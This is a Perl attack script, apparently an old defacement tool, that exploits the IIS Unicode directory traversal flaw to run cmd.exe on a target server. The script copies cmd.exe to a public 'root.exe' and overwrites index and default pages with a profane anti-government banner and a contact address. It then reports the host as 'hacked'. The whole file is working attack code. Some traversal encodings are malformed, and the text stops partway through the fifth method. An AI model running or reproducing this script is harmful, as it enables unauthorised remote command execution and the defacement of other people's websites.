#!/usr/bin/perl
 
use Socket;
# --------------init
if ($#ARGV<0) {die "UNICODE-HACK-PROGRAM

Example: c:\\perl uni.pl www.theriver.com:80 {OR}
         c:\\perl uni.pl 127.0.0.1:80\n";}
($host,$port)=split(/:/,@ARGV[0]);
print "Trying $host.....................\n";
$target = inet_aton($host);
$flag=0;

# ---------------test IF IIS
my @results=sendraw("GET x HTTP/1.0\r\n\r\n");
foreach $line (@results)
{
 if ($line =~ /Server: Microsoft-IIS/) 
{ 

# ---------------test method 1
my @results=sendraw("GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir HTTP/1.0\r\n\r\n");
foreach $line (@results)
{
 if ($line =~ /Directory/) 
 {
  $flag=1;
  my @results1=sendraw("GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir+..\\ HTTP/1.0\r\n\r\n");
  foreach $line1 (@results1)
  {
   if ($line1 =~ /<DIR>/)
   {
    @a=split(/\ /,$line1);
    $b=length($a[-1]);
    $c=substr($a[-1],0,$b-2);
    sendraw("GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+copy+\\winnt\\system32\\cmd.exe+root.exe HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../$c/index.asp HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../$c/index.htm HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../$c/default.asp HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../$c/default.htm HTTP/1.0\r\n\r\n");
   }
  }
  my @results2=sendraw("GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir+..\\wwwroot\\ HTTP/1.0\r\n\r\n");
  foreach $line2 (@results2)
  {
   if ($line2 =~ /<DIR>/)
   {
    @a=split(/\ /,$line2);
    $b=length($a[-1]); 
    $c=substr($a[-1],0,$b-2);
    sendraw("GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+copy+\\winnt\\system32\\cmd.exe+root.exe HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../wwwroot/$c/index.asp HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../wwwroot/$c/index.htm HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../wwwroot/$c/default.asp HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../wwwroot/$c/default.htm HTTP/1.0\r\n\r\n");
   }
  }
 my @results1=sendraw("GET / HTTP/1.0\r\n\r\n");
  foreach $line1 (@results1)
  {
   if ($line1 =~ /fuck USA Government/)
   {
   print "<$host hacked> :-)\n";
   }
  }
exit 0
 }
}

# ---------------test method 2
my @results=sendraw("GET /scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir HTTP/1.0\r\n\r\n");
foreach $line (@results)
{
 if ($line =~ /Directory/) 
 {
  $flag=1;
  my @results1=sendraw("GET /scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir+..\\ HTTP/1.0\r\n\r\n");
  foreach $line1 (@results1)
  {
   if ($line1 =~ /<DIR>/)
   {
    @a=split(/\ /,$line1);
    $b=length($a[-1]);
    $c=substr($a[-1],0,$b-2);
    sendraw("GET /scripts/..%c1%9c../winnt/system32/cmd.exe?/c+copy+\\winnt\\system32\\cmd.exe+root.exe HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../$c/index.asp HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../$c/index.htm HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../$c/default.asp HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../$c/default.htm HTTP/1.0\r\n\r\n");
   }
  }
  my @results2=sendraw("GET /scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir+..\\wwwroot\\ HTTP/1.0\r\n\r\n");
  foreach $line2 (@results2)
  {
   if ($line2 =~ /<DIR>/)
   {
    @a=split(/\ /,$line2);
    $b=length($a[-1]);
    $c=substr($a[-1],0,$b-2);
    sendraw("GET /scripts/..%c1%9c../winnt/system32/cmd.exe?/c+copy+\\winnt\\system32\\cmd.exe+root.exe HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../wwwroot/$c/index.asp HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../wwwroot/$c/index.htm HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../wwwroot/$c/default.asp HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../wwwroot/$c/default.htm HTTP/1.0\r\n\r\n");
   }
  }
 my @results1=sendraw("GET / HTTP/1.0\r\n\r\n");
  foreach $line1 (@results1)
  {
   if ($line1 =~ /fuck USA Government/)
   {
   print "<$host hacked> :-)\n";
   }
  }
exit 0
 }
}

# ---------------test method 3
my @results=sendraw("GET /scripts/..%c1%pc../winnt/system32/cmd.exe?/c+dir HTTP/1.0\r\n\r\n");
foreach $line (@results)
{
 if ($line =~ /Directory/) 
 {
  $flag=1;
  my @results1=sendraw("GET /scripts/..%c1%pc../winnt/system32/cmd.exe?/c+dir+..\\ HTTP/1.0\r\n\r\n");
  foreach $line1 (@results1)
  {
   if ($line1 =~ /<DIR>/)
   {
    @a=split(/\ /,$line1);
    $b=length($a[-1]);
    $c=substr($a[-1],0,$b-2);
    sendraw("GET /scripts/..%c1%pc../winnt/system32/cmd.exe?/c+copy+\\winnt\\system32\\cmd.exe+root.exe HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../$c/index.asp HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../$c/index.htm HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../$c/default.asp HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../$c/default.htm HTTP/1.0\r\n\r\n");
   }
  }
  my @results2=sendraw("GET /scripts/..%c1%pc../winnt/system32/cmd.exe?/c+dir+..\\wwwroot\\ HTTP/1.0\r\n\r\n");
  foreach $line2 (@results2)
  {
   if ($line2 =~ /<DIR>/)
   {
    @a=split(/\ /,$line2);
    $b=length($a[-1]);
    $c=substr($a[-1],0,$b-2);
    sendraw("GET /scripts/..%c1%pc../winnt/system32/cmd.exe?/c+copy+\\winnt\\system32\\cmd.exe+root.exe HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../wwwroot/$c/index.asp HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../wwwroot/$c/index.htm HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../wwwroot/$c/default.asp HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../wwwroot/$c/default.htm HTTP/1.0\r\n\r\n");
   }
  }
 my @results1=sendraw("GET / HTTP/1.0\r\n\r\n");
  foreach $line1 (@results1)
  {
   if ($line1 =~ /fuck USA Government/)
   {
   print "<$host hacked> :-)\n";
   }
  }
exit 0
 }
}

# ---------------test method 4
my @results=sendraw("GET /scripts/..%c0%9v../winnt/system32/cmd.exe?/c+dir HTTP/1.0\r\n\r\n");
foreach $line (@results)
{
 if ($line =~ /Directory/) 
 {
  $flag=1;
  my @results1=sendraw("GET /scripts/..%c0%9v../winnt/system32/cmd.exe?/c+dir+..\\ HTTP/1.0\r\n\r\n");
  foreach $line1 (@results1)
  {
   if ($line1 =~ /<DIR>/)
   {
    @a=split(/\ /,$line1);
    $b=length($a[-1]);
    $c=substr($a[-1],0,$b-2);
    sendraw("GET /scripts/..%c0%9v../winnt/system32/cmd.exe?/c+copy+\\winnt\\system32\\cmd.exe+root.exe HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../$c/index.asp HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../$c/index.htm HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../$c/default.asp HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../$c/default.htm HTTP/1.0\r\n\r\n");
   }
  }
  my @results2=sendraw("GET /scripts/..%c0%9v../winnt/system32/cmd.exe?/c+dir+..\\wwwroot\\ HTTP/1.0\r\n\r\n");
  foreach $line2 (@results2)
  {
   if ($line2 =~ /<DIR>/)
   {
    @a=split(/\ /,$line2);
    $b=length($a[-1]);
    $c=substr($a[-1],0,$b-2);
    sendraw("GET /scripts/..%c0%9v../winnt/system32/cmd.exe?/c+copy+\\winnt\\system32\\cmd.exe+root.exe HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../wwwroot/$c/index.asp HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../wwwroot/$c/index.htm HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../wwwroot/$c/default.asp HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../wwwroot/$c/default.htm HTTP/1.0\r\n\r\n");
   }
  }
 my @results1=sendraw("GET / HTTP/1.0\r\n\r\n");
  foreach $line1 (@results1)
  {
   if ($line1 =~ /fuck USA Government/)
   {
   print "<$host hacked> :-)\n";
   }
  }
exit 0
 }
}

# ---------------test method 5
my @results=sendraw("GET /scripts/..%c0%qf../winnt/system32/cmd.exe?/c+dir HTTP/1.0\r\n\r\n");
foreach $line (@results)
{
 if ($line =~ /Directory/) 
 {
  $flag=1;
  my @results1=sendraw("GET /scripts/..%c0%qf../winnt/system32/cmd.exe?/c+dir+..\\ HTTP/1.0\r\n\r\n");
  foreach $line1 (@results1)
  {
   if ($line1 =~ /<DIR>/)
   {
    @a=split(/\ /,$line1);
    $b=length($a[-1]);
    $c=substr($a[-1],0,$b-2);
    sendraw("GET /scripts/..%c0%qf../winnt/system32/cmd.exe?/c+copy+\\winnt\\system32\\cmd.exe+root.exe HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../$c/index.asp HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../$c/index.htm HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../$c/default.asp HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../$c/default.htm HTTP/1.0\r\n\r\n");
   }
  }
  my @results2=sendraw("GET /scripts/..%c0%qf../winnt/system32/cmd.exe?/c+dir+..\\wwwroot\\ HTTP/1.0\r\n\r\n");
  foreach $line2 (@results2)
  {
   if ($line2 =~ /<DIR>/)
   {
    @a=split(/\ /,$line2);
    $b=length($a[-1]);
    $c=substr($a[-1],0,$b-2);
    sendraw("GET /scripts/..%c0%qf../winnt/system32/cmd.exe?/c+copy+\\winnt\\system32\\cmd.exe+root.exe HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../wwwroot/$c/index.asp HTTP/1.0\r\n\r\n");
    sendraw("GET /scripts/root.exe?/c+echo+^<html^>^<body+bgcolor%3Dblack^>^<br^>^<br^>^<br^>^<br^>^<br^>^<br^>^<table+width%3D100%^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+USA+Government^</font^>^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D7+color%3Dred^>fuck+PoizonBOx^<tr^>^<td^>^<p+align%3D%22center%22^>^<font+size%3D4+color%3Dred^>contact:sysadmcn\@yahoo.com.cn^</html^>>../wwwroot/$c/index.htm HTTP/1.0\r\n\r\n");
